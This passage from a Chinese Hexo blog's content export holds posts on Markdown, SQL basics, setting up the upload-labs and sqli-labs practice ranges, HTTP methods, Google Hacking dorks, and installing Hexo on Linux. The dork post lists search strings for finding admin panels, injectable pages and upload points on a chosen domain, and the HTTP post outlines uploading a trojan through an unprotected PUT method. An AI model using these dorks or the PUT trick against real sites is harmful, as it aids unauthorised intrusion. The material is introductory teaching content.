###### 标题H6</code></pre><h2 id="字符效果和横线"><a href="#字符效果和横线" class="headerlink" title="字符效果和横线"></a>字符效果和横线</h2><p><code>~~删除线~~</code></p>
<p><del>删除线</del></p>
<p><code>*斜体字*</code></p>
<p><em>斜体字</em></p>
<p><code>**粗体**</code></p>
<p><strong>粗体</strong></p>
<p><code>***粗斜体***</code></p>
<p><strong><em>粗斜体</em></strong></p>
<p><code>上标：X&lt;sub&gt;2&lt;/sub&gt;</code></p>
<p>上标：X<sub>2</sub></p>
<p><code>下标：O&lt;sup&gt;2&lt;/sup&gt;</code></p>
<p>下标：O<sup>2</sup></p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>&gt; 区块引用</p>
<p>&gt; &gt; 嵌套引用</p>
<p>&gt; &gt; &gt;三嵌套引用</p>
<p>&gt; &gt; &gt; &gt; 四嵌套引用</p>
<blockquote>
<p>区块引用</p>
</blockquote>
<blockquote>
<blockquote>
<p>嵌套引用</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>三嵌套引用</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>四嵌套引用</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<h2 id="锚点与链接"><a href="#锚点与链接" class="headerlink" title="锚点与链接"></a>锚点与链接</h2><pre><code>[普通链接]( https://www.wisejay.top/)
[普通链接带标题]( https://www.wisejay.top/ &quot;普通链接带题&quot;)
直接链接：&lt;https://www.wisejay.top/&gt;</code></pre><p><a href="https://www.wisejay.top/" target="_blank" rel="noopener">普通链接</a></p>
<p><a href="https://www.wisejay.top/" title="普通链接带题" target="_blank" rel="noopener">普通链接带标题</a></p>
<p>直接链接：<a href="https://www.wisejay.top/" target="_blank" rel="noopener">https://www.wisejay.top/</a></p>
<h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><pre><code>`行内代码`</code></pre><p><code>行内代码</code></p>
<p>缩进风格(四个空格既tab键)</p>
<pre><code>缩进风格(四个空格既tab键)</code></pre><hr>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```指定代码类型</span><br><span class="line">代码</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"markdown"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p><code>![名字](图片地址 &quot;标题&quot;)</code></p>
<p>标题可加可不加</p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code>- 无序列表（减号）

* 无序列表（星号）

+ 无序列表（加号）</code></pre><ul>
<li><p>无序列表</p>
</li>
<li><p>无序列表</p>
</li>
</ul>
<ul>
<li><p>无序列表嵌套</p>
<ul>
<li>无序列表嵌套</li>
</ul>
</li>
</ul>
<pre><code>1.    有序列表
2.    有序列表
3.    有序列表</code></pre><ol>
<li>有序列表</li>
<li>有序列表</li>
<li>有序列表</li>
</ol>
<h2 id="绘制表格"><a href="#绘制表格" class="headerlink" title="绘制表格"></a>绘制表格</h2><pre><code>First Header  | Second Header
------------- | -------------
Content Cell  | Content Cell
Content Cell  | Content Cell</code></pre><table>
<thead>
<tr>
<th>First Header</th>
<th>Second Header</th>
</tr>
</thead>
<tbody><tr>
<td>Content Cell</td>
<td>Content Cell</td>
</tr>
<tr>
<td>Content Cell</td>
<td>Content Cell</td>
</tr>
</tbody></table>
<h2 id="更多用法可以自己上网查看"><a href="#更多用法可以自己上网查看" class="headerlink" title="更多用法可以自己上网查看"></a>更多用法可以自己上网查看</h2><h1 id="Markdown编辑器"><a href="#Markdown编辑器" class="headerlink" title="Markdown编辑器"></a>Markdown编辑器</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>MarkdownPad</p>
<p>Typora</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>ReText</p>
<h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><p>Auto</p>
<p>Mou</p>
<h2 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h2><p>Editor.md:<a href="https://www.mdeditor.com/" target="_blank" rel="noopener">https://www.mdeditor.com/</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>印象笔记</p>
<p>有道笔记</p>
<p>为知笔记</p>
]]></content>
      
        <categories>
            
            <category> 博客 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL基础语法]]></title>
      <url>/2019/08/03/SQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="SQL中SELECT的语句结构"><a href="#SQL中SELECT的语句结构" class="headerlink" title="SQL中SELECT的语句结构"></a>SQL中SELECT的语句结构</h1><blockquote>
<p>SELECT * FROM 表名 WHERE 条件表达式;</p>
</blockquote>
<p>*代表查询全部，如何只查询某字段则填写字段；</p>
<h1 id="去重查询DISINCT"><a href="#去重查询DISINCT" class="headerlink" title="去重查询DISINCT"></a>去重查询DISINCT</h1><blockquote>
<p>SELECT DISTINCT 字段名 FROM 表名;</p>
</blockquote>
<p>字段名可以有多个</p>
<h1 id="AND-LKIE-IN"><a href="#AND-LKIE-IN" class="headerlink" title="AND LKIE IN"></a>AND LKIE IN</h1><blockquote>
<p>WHERE子句 SELECT * FROM 表名 WHERE 字段=条件</p>
</blockquote>
<p>条件可以有多个</p>
<blockquote>
<p>SELECT * FROM 表名 WHERE 字段=’漏洞’;</p>
</blockquote>
<p>字段加单引号</p>
<blockquote>
<p>SELECT * FROM 表名 WHERE 字段1=’BUG’ AND 字段2=10086;<br><br>SELECT * FROM 表名 WHERE 字段1 BETWEEN 100 and 200;<br><br>SELECT * FROM 表名 WHERE 字段 LIKE ‘%漏洞%’;</p>
</blockquote>
<p>%漏洞 查找以漏洞结尾的<br>漏洞% 查找以漏洞开头的<br></p>
<blockquote>
<p>SELECT * FROM 表名 WHERE 字段 IN (100,200,300);</p>
</blockquote>
<h1 id="ORDER-BY-用于排序，默认是升序"><a href="#ORDER-BY-用于排序，默认是升序" class="headerlink" title="ORDER BY 用于排序，默认是升序"></a>ORDER BY 用于排序，默认是升序</h1><blockquote>
<p>SELECT * FROM 表名 ORDER BY  字段名 ASC;–升序</p>
<p>SELECT * FROM 表名 ORDER BY 字段名 DESC;–降序</p>
</blockquote>
<h1 id="LIMIT-用于指定范围取记录"><a href="#LIMIT-用于指定范围取记录" class="headerlink" title="LIMIT 用于指定范围取记录"></a>LIMIT 用于指定范围取记录</h1><blockquote>
<p>SELECT * FROM 表名  LIMIT 1;<br><br>等价于 SELECT * FROM 表  LIMIT 0,1;</p>
</blockquote>
<p>SELECT * FROM 表 名 LIMIT 从第几条开始（默认从0开始）, 取几条;</p>
<h1 id="INSERT用于新增数据"><a href="#INSERT用于新增数据" class="headerlink" title="INSERT用于新增数据"></a>INSERT用于新增数据</h1><blockquote>
<p>INSERT  表名 VALUES(column1_value,column2_value,…..);<br><br>INSERT 表名(column1,column2,column3,..)VALUE(column1_value,column2_value,column3…);</p>
</blockquote>
<h1 id="DELETE用于删除数据"><a href="#DELETE用于删除数据" class="headerlink" title="DELETE用于删除数据"></a>DELETE用于删除数据</h1><blockquote>
<p>删除记录 DELETE FROM 表; – 清空表中的数据 <br><br>DELETE  FROM  表 WHERE ID = 50; – 删除ID=50的数据。</p>
</blockquote>
<h1 id="UPDATE用于更新数据"><a href="#UPDATE用于更新数据" class="headerlink" title="UPDATE用于更新数据"></a>UPDATE用于更新数据</h1><blockquote>
<p>UPDATE 表名 SET column1=column1_value,column2=column2_value,… WHERE…</p>
</blockquote>
<p>UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</p>
<h1 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h1><blockquote>
<p>列的别名：SELECT name AS n, country AS c FROM Websites;<br><br>表的别名：SELECT w.name, w.url, a.count, a.date<br>FROM Websites AS w, access_log AS a<br>WHERE a.site_id=w.id and w.name=”别名”;</p>
</blockquote>
<h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><p>在SQL语言中，一个SELECT-FROM-WHERE语句称为一个查询块。 当获得一个查询的答案需要多个步骤的操作，首先必须创建一个查询来确定用户不知道但包含在数据库中 的值，将一个查询块嵌套在另一个查询块的WHERE字句或HAVING短语的条件中查询块称为子查询或内 层查询。上层的查询块曾为父查询或外层查询。子查询的结果作为输入传递回“父查询”或“外部查询”。 父查询将这个值结合到计算中，以便确定最后的输出。</p>
<blockquote>
<p>SELECT * FROM COMPANY WHERE ID IN (SELECT ID FROM COMPANY WHERE SALARY &gt; 45000) ;</p>
</blockquote>
<h1 id="Join查询"><a href="#Join查询" class="headerlink" title="Join查询"></a>Join查询</h1><p>SQL Join：如果表中有至少一个匹配，则返回行<br><br>SQL Inner Join 等于 SQL Join<br></p>
<blockquote>
<p>SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; </p>
</blockquote>
<ul>
<li>SQL Left Join：即使右表中没有匹配，也从左表返回所有的行</li>
<li>SQL Right Join：即使左表中没有匹配，也从右表返回所有的行</li>
<li>SQL Full Join：只要其中一个表中存在匹配，就返回行</li>
</ul>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="AVG-函数"><a href="#AVG-函数" class="headerlink" title="AVG() 函数"></a>AVG() 函数</h2><p>返回数值列的平均值</p>
<blockquote>
<p>SELECT AVG(column_name) FROM table_name;</p>
</blockquote>
<h2 id="COUNT-函数"><a href="#COUNT-函数" class="headerlink" title="COUNT() 函数"></a>COUNT() 函数</h2><p>返回匹配指定条件的行数</p>
<blockquote>
<p>SELECT COUNT(column_name) FROM table_name;</p>
</blockquote>
<h2 id="COUNT-函数-1"><a href="#COUNT-函数-1" class="headerlink" title="COUNT(*) 函数"></a>COUNT(*) 函数</h2><p>返回表中的记录数</p>
<blockquote>
<p>SELECT COUNT(*) FROM table_name;</p>
</blockquote>
<h2 id="COUNT-DISTINCT-column-name-函数"><a href="#COUNT-DISTINCT-column-name-函数" class="headerlink" title="COUNT(DISTINCT column_name)函数"></a>COUNT(DISTINCT column_name)函数</h2><p>返回指定列的不同值的数目</p>
<blockquote>
<p>SELECT COUNT(DISTINCT column_name) FROM table_name;</p>
</blockquote>
<h2 id="MAX-函数"><a href="#MAX-函数" class="headerlink" title="MAX() 函数"></a>MAX() 函数</h2><p>返回指定列的最大值</p>
<blockquote>
<p>SELECT MAX(column_name) FROM table_name;</p>
</blockquote>
<h2 id="MIN-函数"><a href="#MIN-函数" class="headerlink" title="MIN() 函数"></a>MIN() 函数</h2><p>返回指定列的最小值</p>
<blockquote>
<p>SELECT MIN(column_name) FROM table_name;</p>
</blockquote>
<h2 id="SUM-函数"><a href="#SUM-函数" class="headerlink" title="SUM() 函数"></a>SUM() 函数</h2><p>返回数值列的总数</p>
<blockquote>
<p>SELECT SUM(column_name) FROM table_name;</p>
</blockquote>
<h2 id="MID-函数"><a href="#MID-函数" class="headerlink" title="MID() 函数"></a>MID() 函数</h2><p>用于从文本字段中提取字符</p>
<blockquote>
<p>SELECT MID(column_name,start [ , length] ) FROM table_name;</p>
</blockquote>
<h2 id="LEN-函数"><a href="#LEN-函数" class="headerlink" title="LEN() 函数"></a>LEN() 函数</h2><p>返回文本字段中值的长度</p>
<blockquote>
<p>SELECT LENGTH(column_name) FROM table_name;</p>
</blockquote>
<h1 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h1><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果。</p>
<blockquote>
<p>SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2;<br><br>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[upload-labs靶场安装]]></title>
      <url>/2019/08/03/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<h1 id="upload-labs简介"><a href="#upload-labs简介" class="headerlink" title="upload-labs简介"></a>upload-labs简介</h1><p>是一个使用PHP语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场</p>
<h1 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h1><ul>
<li>操作系统：windows或Linux</li>
<li>Php版本：推荐5.2.17其他版本可能会导致部分关卡无法突破</li>
<li>中间件：Apache</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Windows环境安装"><a href="#Windows环境安装" class="headerlink" title="Windows环境安装"></a>Windows环境安装</h2><p>下载地址：<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs/releases</a></p>
<p>这个是集成环境绿色免安装，解压即可使用。</p>
<h2 id="Linux环境安装"><a href="#Linux环境安装" class="headerlink" title="Linux环境安装"></a>Linux环境安装</h2><p>创建镜像</p>
<pre><code>$ cd upload-labs/docker
$ docker build -t upload-labs</code></pre><p>或</p>
<pre><code>$ docker pull c0ny1/upload-labs</code></pre><p>创建容器</p>
<pre><code>$ docker run -d -p 80:80 upload-labs:latest</code></pre><h1 id="通关秘籍"><a href="#通关秘籍" class="headerlink" title="通关秘籍"></a>通关秘籍</h1><p><a href="https://xz.aliyun.com/t/2435" target="_blank" rel="noopener">https://xz.aliyun.com/t/2435</a></p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqli-labs靶场搭建]]></title>
      <url>/2019/08/01/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="SQLi-Labs简介"><a href="#SQLi-Labs简介" class="headerlink" title="SQLi-Labs简介"></a>SQLi-Labs简介</h1><p>Sqli-labs是一个印度程序员写的专业的SQL注入练习平台。</p>
<h1 id="SQLi-Labs环境要求"><a href="#SQLi-Labs环境要求" class="headerlink" title="SQLi-Labs环境要求"></a>SQLi-Labs环境要求</h1><ul>
<li>1.apache+mysql+php</li>
<li>2.Tomcat+mysql+java（部分关卡需要）</li>
<li>Windows和linux环境均可安装。</li>
<li>本次使windows环境下使用phpstudy来安装。</li>
</ul>
<h1 id="Sqli-labs安装"><a href="#Sqli-labs安装" class="headerlink" title="Sqli-labs安装"></a>Sqli-labs安装</h1><h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>Sqli-labs源码：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>Phpstudy：<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">http://phpstudy.php.cn/</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>安装phpstudy</li>
<li>将下载sqli-labs的源码sqli-labs-master解压缩到WWW目录下面</li>
<li>因为phpstudy的数据库默认用户名跟密码都是root，我们需要将sqli-labs-master\sql-connections文件夹中db-creds.inc文件中的用户名密码改为root。</li>
<li>在本机通过浏览器访问127.0.0.1/sqli-labs-master</li>
<li>在页面中点击Setup/reset Database for labs进行数据库的配置</li>
<li>配置完成返回即可使用。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP协议]]></title>
      <url>/2019/07/18/HTTP%E5%8D%8F%E8%AE%AE/</url>
      <content type="html"><![CDATA[<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>协议，网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。如怎么样建立连接、怎么样互相识别等。只有遵守这个约定，计算机之间才能相互通信交流。它的三要素是：语法、语义、时序。为了使数据在网络上从源到达目的，网络通信的参与方必须遵循相同的规则，这套规则称为协议（protocol），它最终体现为在网络上传输的数据包的格式。</p>
<h2 id="HTTP协议-1"><a href="#HTTP协议-1" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>HTTP(HyperText Transfer Protocol)即超文本传输协议。它详细规定了浏览器和web服务器之间的通信的格式，是万维网交换信息的基础。</p>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(统一资源定位符）又称网页地址。就如同现实世界中的门牌号一样，它是网络上的门牌号。通过它我们可以到网络上任意一个公开的web服 务中寻找我们需要的信息。</p>
<p>常用的URL格式如下：协议类型://服务器地址[:端口号]/路径/文件名[参数=值]</p>
<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><h2 id="GET-方法"><a href="#GET-方法" class="headerlink" title="GET 方法"></a>GET 方法</h2><p>GET 方法用于获取请求页面的指定信息，我们平时浏览网页大部分用的都是GET的方法。如果我们请求的页面为动态脚本页面，则 返回的结果是容器解析过的HTML源代码。</p>
<h2 id="POST-方法"><a href="#POST-方法" class="headerlink" title="POST 方法"></a>POST 方法</h2><p>POST方法也与GET 方法类似，但是最大的区别在于。GET方法没有请求内容，但是post方法是有请求内容的。POST的请求可以 向服务器发送大量的信息。eg:文件上传。虽然GET方法也可以传送数据，但是有长度的限制，而且get请求会将发送的数据明文显示出来。而 post不会,所以安全性相对高一点。eg:账户密码登录。</p>
<h2 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h2><p>PUT方法会把http请求消息中的请求正文存储在web服务器的指定目录下。如果存在，则会替换。此方法属于极度危险的方法。</p>
<h2 id="OPTIONS方法"><a href="#OPTIONS方法" class="headerlink" title="OPTIONS方法"></a>OPTIONS方法</h2><p>用于试探服务器支持的http方法。</p>
<h2 id="DELETE方法"><a href="#DELETE方法" class="headerlink" title="DELETE方法"></a>DELETE方法</h2><p>用于删除指定web目录下的资源</p>
<h2 id="HEAD-方法"><a href="#HEAD-方法" class="headerlink" title="HEAD 方法"></a>HEAD 方法</h2><p>方法几乎是相同的，它们的区别在于 HEAD 方法只是请求消息报头，而不是完整的内容。对于 HEAD 请求的回应部分来说，它的 HTTP 头部中包含的信息与通过 GET 请求所得到的信息是相同的。利用这个方法，不必传输整个资源内容，就可以得到 Request-URI 所标识的资源的信息。这个方法通常被用于测试超链接的有效性，是否可以访问，以及最近是否更新。</p>
<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><table>
<thead>
<tr>
<th>分类</th>
<th>分类描述</th>
</tr>
</thead>
<tbody><tr>
<td>1**</td>
<td>信息，服务器收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td>2**</td>
<td>成功，操作被成功接收并处理</td>
</tr>
<tr>
<td>3**</td>
<td>重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td>4**</td>
<td>客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td>5**</td>
<td>服务器错误，服务器在处理请求的过程中发生了错误</td>
</tr>
</tbody></table>
<h1 id="常见的HTTP状态码"><a href="#常见的HTTP状态码" class="headerlink" title="常见的HTTP状态码"></a>常见的HTTP状态码</h1><ul>
<li>200 - 请求成功</li>
<li>资源（网页等）被永久转移到其它URL</li>
<li>请求的资源（网页等）不存在</li>
<li>内部服务器错误</li>
</ul>
<h1 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h1><p>是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 </p>
<h1 id="HTTPS安全"><a href="#HTTPS安全" class="headerlink" title="HTTPS安全"></a>HTTPS安全</h1><p>当用户打开PUT、MOV等危险的方法并且没有做验证时，就会产生被人攻击的可能性。 简单的思路：当目录给了读写权限，可以直接put上去一个木马。 当服务端禁止上传动态脚本时：可以先上传一个普通文件，然后mov文件改名，或者结合其他的漏洞。</p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Google Hacking语法]]></title>
      <url>/2019/07/17/Google-Hacking%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="定义："><a href="#定义：" class="headerlink" title="定义："></a><strong>定义：</strong></h1><p>Google Hacking的含义原指利用Google Google搜索引擎搜索信息来进行入侵的技术和行为；现指利用各种搜索引擎搜索信息来进行入侵的技术和行为。</p>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法:"></a><strong>基础语法:</strong></h1><ul>
<li>逻辑与：and</li>
<li>逻辑或： or 、|</li>
<li>逻辑非： -</li>
<li>完整匹配：”关键词” </li>
<li>通配符：* ?</li>
</ul>
<h1 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法:"></a><strong>高级语法:</strong></h1><h2 id="intitle：搜索网页标题中包含有特定字符的网页"><a href="#intitle：搜索网页标题中包含有特定字符的网页" class="headerlink" title="intitle：搜索网页标题中包含有特定字符的网页"></a>intitle：搜索网页标题中包含有特定字符的网页</h2><pre><code>intitel:admin </code></pre><p>返回标题为admin的网页</p>
<h2 id="intext-搜索网页正文内容中的指定字符"><a href="#intext-搜索网页正文内容中的指定字符" class="headerlink" title="intext: 搜索网页正文内容中的指定字符"></a>intext: 搜索网页正文内容中的指定字符</h2><pre><code>intext:计算机</code></pre><p>返回正文包含计算机的网页</p>
<h2 id="inurl：将返回url中含有关键词的网页"><a href="#inurl：将返回url中含有关键词的网页" class="headerlink" title="inurl：将返回url中含有关键词的网页"></a>inurl：将返回url中含有关键词的网页</h2><pre><code>inurl:admin</code></pre><p>返回url中含有admin的网页</p>
<h2 id="site-找到与指定网站有联系的URL"><a href="#site-找到与指定网站有联系的URL" class="headerlink" title="site: 找到与指定网站有联系的URL"></a>site: 找到与指定网站有联系的URL</h2><pre><code>site:baidu.com</code></pre><p>返回与baidu.com有关的网页</p>
<h2 id="filetype-搜索指定类型的文件"><a href="#filetype-搜索指定类型的文件" class="headerlink" title="filetype:搜索指定类型的文件"></a>filetype:搜索指定类型的文件</h2><pre><code>filetype:txt</code></pre><p>返回txt文件</p>
<h2 id="link-指定链接的网页"><a href="#link-指定链接的网页" class="headerlink" title="link: 指定链接的网页"></a>link: 指定链接的网页</h2><pre><code>link:www.baidu.com</code></pre><p>返回所有包含指向 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的网页</p>
<h2 id="info-查询网站的一些信息"><a href="#info-查询网站的一些信息" class="headerlink" title="info: 查询网站的一些信息"></a>info: 查询网站的一些信息</h2><pre><code>info:www.baidu.com </code></pre><p>将返回百度的一些信息</p>
<h2 id="define-查询关键词的词义"><a href="#define-查询关键词的词义" class="headerlink" title="define: 查询关键词的词义"></a>define: 查询关键词的词义</h2><pre><code>define:计算机</code></pre><p>将返回关于计算机的定义</p>
<h2 id="cache-关于某些内容的缓存"><a href="#cache-关于某些内容的缓存" class="headerlink" title="cache: 关于某些内容的缓存"></a>cache: 关于某些内容的缓存</h2><pre><code>cache:www.baidu.com</code></pre><p>返回百度历史缓存</p>
<h1 id="综合语法"><a href="#综合语法" class="headerlink" title="综合语法:"></a><strong>综合语法:</strong></h1><h2 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h2><pre><code>inurl:login|admin|manage|管理|后台</code></pre><h2 id="查找文本内容"><a href="#查找文本内容" class="headerlink" title="查找文本内容"></a>查找文本内容</h2><pre><code>site:域名 intext:管理|后台|登陆|</code></pre><h2 id="查找可注入点"><a href="#查找可注入点" class="headerlink" title="查找可注入点"></a>查找可注入点</h2><pre><code>site:域名 inurl:aspx|jsp|php|asp</code></pre><h2 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h2><pre><code>site:域名 inurl:file|load</code></pre><h2 id="查看服务器使用的脚本"><a href="#查看服务器使用的脚本" class="headerlink" title="查看服务器使用的脚本"></a>查看服务器使用的脚本</h2><pre><code>site:域名 filetype:asp
site:域名 filetype:aspx
site:域名 filetype:jsp
site:域名 filetype:php</code></pre><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/gk.png" alt="Google-Hacking" title class>
                <p>Google-Hacking</p>
            </figure>

]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> google hacking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux系统搭建Hexo博客]]></title>
      <url>/2019/07/16/Linux%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要准备的东西：Github账号、Node.js环境、git工具</p>
<h1 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h1><pre><code>sudo yum install git-core</code></pre><h1 id="Node-js环境"><a href="#Node-js环境" class="headerlink" title="Node.js环境"></a>Node.js环境</h1><h6 id="下载-Node-js"><a href="#下载-Node-js" class="headerlink" title="下载 Node.js"></a>下载 Node.js</h6><pre><code>wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code></pre><h6 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h6><pre><code>source ~/.bash_profile</code></pre><h6 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h6><pre><code>nvm install stable</code></pre><h1 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h1><h6 id="用命令创建-hexo-文件夹"><a href="#用命令创建-hexo-文件夹" class="headerlink" title="用命令创建 hexo 文件夹"></a>用命令创建 hexo 文件夹</h6><pre><code>mkdir hexo</code></pre><h6 id="用命令安装-hexo"><a href="#用命令安装-hexo" class="headerlink" title="用命令安装 hexo"></a>用命令安装 hexo</h6><pre><code>npm install -g hexo-cli</code></pre><h6 id="进入Hexo"><a href="#进入Hexo" class="headerlink" title="进入Hexo"></a>进入Hexo</h6><pre><code>cd hexo/</code></pre><h6 id="初始化-hexo"><a href="#初始化-hexo" class="headerlink" title="初始化 hexo"></a>初始化 hexo</h6><pre><code>hexo init</code></pre><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h6 id="打开-hexo-服务"><a href="#打开-hexo-服务" class="headerlink" title="打开 hexo 服务"></a>打开 hexo 服务</h6><pre><code>hexo server</code></pre><h1 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h1><h6 id="设置-user-name-和-user-email"><a href="#设置-user-name-和-user-email" class="headerlink" title="设置 user.name 和 user.email"></a>设置 user.name 和 user.email</h6><pre><code>git config --global user.name &quot;github名称&quot;
git config --global user.email &quot;github邮箱&quot;</code></pre><h6 id="生成-ssh-密匙"><a href="#生成-ssh-密匙" class="headerlink" title="生成 ssh 密匙"></a>生成 ssh 密匙</h6><pre><code>ssh-keygen -t rsa -C &quot;github邮箱&quot;</code></pre><p>然后出现密钥保存的路径一直按回车</p>
<h6 id="查看密钥"><a href="#查看密钥" class="headerlink" title="查看密钥"></a>查看密钥</h6><pre><code>cd .ssh
vim id_rsa.pub</code></pre><p>复制里面的内容</p>
<pre><code>:q</code></pre><p>退出</p>
<h6 id="创建-GitHub-仓库"><a href="#创建-GitHub-仓库" class="headerlink" title="创建 GitHub 仓库"></a>创建 GitHub 仓库</h6><pre><code>命名格式为&quot;github名称&quot;.github.io</code></pre><h6 id="添加密钥"><a href="#添加密钥" class="headerlink" title="添加密钥"></a>添加密钥</h6><p>登陆github—进入设置—找到ssh设置密钥把刚刚复制的粘贴进去即可</p>
<h6 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h6><p>打开 hexo 配置文件 _config.yml修改对应部分</p>
<pre><code>cd hexo
vim _config.yml</code></pre><p>找到以下内容并修改</p>
<pre><code>deploy:
type: git
repo: git@github.com:github名称/github名称.github.io.git 
branch: master</code></pre><h6 id="生成并部署"><a href="#生成并部署" class="headerlink" title="生成并部署"></a>生成并部署</h6><pre><code>hexo clean
